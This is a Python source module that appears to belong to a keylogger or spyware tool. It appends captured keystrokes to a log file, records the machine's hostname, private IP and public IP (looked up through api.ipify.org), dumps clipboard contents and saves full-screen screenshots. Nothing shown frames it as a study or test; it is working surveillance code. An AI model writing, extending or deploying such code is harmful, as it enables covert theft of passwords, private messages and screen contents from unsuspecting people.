import socket
import platform

from requests import get
from modules.constants import counter, keys, log_path, output, printing, sys_info, clipboard, screenshot_file
from pandas.io.clipboard import clipboard_get
from PIL import ImageGrab

counter = counter
keys = keys


def write_file(keys):
    with open(log_path + output, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def computer_information():
    with open(log_path + sys_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


def copy_clipboard():
    with open(log_path + clipboard, "a") as f:
        try:
            text = clipboard_get()
            f.write("Clipboard Data: \n" + text)
        except:
            f.write("Clipboard could be not be copied")

def screenshot(index):
    im = ImageGrab.grab()
    im.save(log_path + str(index) + screenshot_file)